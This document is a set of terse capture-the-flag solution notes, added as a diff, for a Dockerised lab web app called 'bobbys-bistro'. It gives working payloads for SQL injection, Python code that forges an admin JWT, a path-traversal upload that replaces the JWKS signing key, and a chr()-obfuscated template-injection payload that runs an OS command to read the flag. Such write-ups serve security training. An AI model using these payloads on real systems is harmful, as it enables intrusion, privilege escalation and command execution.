@@ -1,0 +1,105 @@
+we have the public key used to sign the jwt
+
+{
+  "keys": [
+    {
+      "alg": "RS256",
+      "e": "AQAB",
+      "kid": "4528fd341f1f60ca01c038b7841036ad",
+      "kty": "RSA",
+      "n": "-Ztz86B0JYXYIFXOe5Fk9Q9rNiEi42geiyDudA-cTcODGyM6mU1op6zNah2ybTHKXZff1sYTky8yMrQpUbGdOOuC9q3O9x8R_eq1YoR0CT629xIHCAd2Z-eASZhAmT-3Sd_G6Qx6ffczlKvnFO1RWEVxJOYS_TgjNJukRlQVaF6YHc3MPH4V4coS5Z3_lXqvG3eQJj_AvAJot9yQ3JgXwJRNP6lrlZcYIReVQwu5iiKW3mYt3wSk2aYzhlFsgIh0jNI7ddKhOxrWADc73JQDDSUO9ex_ZauAe0xulTLQTItL9EkALE0BAPMlNNYCBWzbHN22fkZh_EyB08VOmS1Ghw",
+      "use": "sig"
+    }
+  ]
+}
+
+attack vector - SQLI get admin token -> filewrite jwks.json -> forge an admin JWT -> SSTI at POST /api/announcement -> flag
+
+build docker container and run it
+docker build -t bobbys-bistro .
+docker run --rm -it -p 3000:3000 bobbys-bistro
+
+SQLI at /profile
+
+token=21232f297a57a5a743894a0e4a801fc3'%20OR%20'1'%3D'1
+
+User ID:23faadf7-7715-4d60-aaba-33456865212f
+Username:bobby_aa80036e366f97a32df0
+Role:admin
+
+Create new jwt_payload and admin token 
+
+import json
+import jwt
+import secrets
+import base64
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.backends import default_backend
+
+admin_uuid = "23faadf7-7715-4d60-aaba-33456865212f"
+priv = rsa.generate_private_key(public_exponent=65537, key_size=2048,
+                                 backend=default_backend())
+pub_numbers = priv.public_key().public_numbers()
+
+def b64url(n):
+    length = (n.bit_length() + 7) // 8
+    return base64.urlsafe_b64encode(n.to_bytes(length, "big")).rstrip(b"=").decode()
+
+MY_KID = secrets.token_hex(16)
+jwks_payload = json.dumps({
+    "keys": [{
+        "kty": "RSA", "use": "sig", "alg": "RS256",
+        "kid": MY_KID,
+        "n": b64url(pub_numbers.n),
+        "e": b64url(pub_numbers.e),
+    }]
+}).encode()
+
+priv_pem = priv.private_bytes(
+    serialization.Encoding.PEM,
+    serialization.PrivateFormat.TraditionalOpenSSL,
+    serialization.NoEncryption()
+)
+with open("jwt_payload","w") as f:
+    json.dump(json.loads(jwks_payload), f)
+forged = jwt.encode({"user_id": admin_uuid}, priv_pem, algorithm="RS256",
+                    headers={"kid": MY_KID, "alg": "RS256"})
+print(f"\n {forged}\n")
+
+Path traversal on upload attachment uploaded new jwks.json 
+
+------WebKitFormBoundaryGLgvYRlA1YwkqpUG
+Content-Disposition: form-data; name="message"
+
+take this 
+------WebKitFormBoundaryGLgvYRlA1YwkqpUG
+Content-Disposition: form-data; name="attachment"; filename="../static/.well-known/jwks.json"
+Content-Type: application/json
+
+{"keys": [{"kty": "RSA", "use": "sig", "alg": "RS256", "kid": "9132a4302c5cb11b0c9ebc85fa3b046a", "n": "uNJyrMaM0z-Bj02Gb7ccVuvII0WOJ6WekSPUP1goGu6Hr5DCFGw8tOJ9uN6nKB-O-JEURRHS7Yr2K4YCv__ssyJ6J3vOC43_uDqfpfuSb9e1zYBtFFhd_TL_xv6wsUSFf4l60l-w25XM9zQ-tRBeAgo8FeVHzrGjCu4SXaUq8mNtwdqAsjEkvGFwx60XRprrzqrpMU9YDC8ydx0UMOmzTnnVOUutn7mgmqsUFCZqHpGsIcOQ6By_UUD3CMv6T70ufff6Vq3kYsxwp8t29EJcPwlwY4R7j1JzC0LEd81RIP3ZrvaE6KyAp8uMs1PLqdF4AGYRRoPsN6eqdUxCG5x_xQ", "e": "AQAB"}]}
+------WebKitFormBoundaryGLgvYRlA1YwkqpUG--
+
+forge a new admin cookie
+
+eyJhbGciOiJSUzI1NiIsImtpZCI6IjZiODlkYTgwYTU1M2E4OGJlNmVkMWJlN2Q1YWQ4YzhiIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYzNhMGZhNmQtMTI0YS00MDE5LWIwNzYtYTcyNDQxYjc1YWJlIn0.lkHggRtQNrAxQBoenBphCErr7X13FVhCuz0oAh7OY0d-ySRnd6VE4hmD5A3G7pU6IvRvb1RMjMDQBiCucQQygmmBFbYvdINLS8ikC_U5OpWrWmtIU2FyDFpZYqnma3Jn4p_-EvExy8wk_yIo_nHdFNub9U6bcmGk92prFG_jIV1QHwwuVNrMYs9bUrLvkdj2xLv12ul-09b4w3bfGGJ7R3MKIM42B5eKzqA99NpHBPczzQcwNwhE9DNjPPLAtFidXzC_Y80_hioaTD_o4wDHfKXcxNj0IPDN8iq43A-ma8FkKu7SWlerrIkYm-FFwWyQ9hlXkqEcL07sUkVnTv7DpQ
+
+send POST /api/announcements
+
+------WebKitFormBoundaryCGnBtlg8P79avera
+Content-Disposition: form-data; name="title"
+
+something
+------WebKitFormBoundaryCGnBtlg8P79avera
+Content-Disposition: form-data; name="announcement"
+
+<div tal:content='python:eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(112)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(95)+chr(42)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41))'>x</div>
+------WebKitFormBoundaryCGnBtlg8P79avera
+Content-Disposition: form-data; name="personalized"
+
+0
+------WebKitFormBoundaryCGnBtlg8P79avera--
+
+GET /announcements/view?q=
+
+Flag
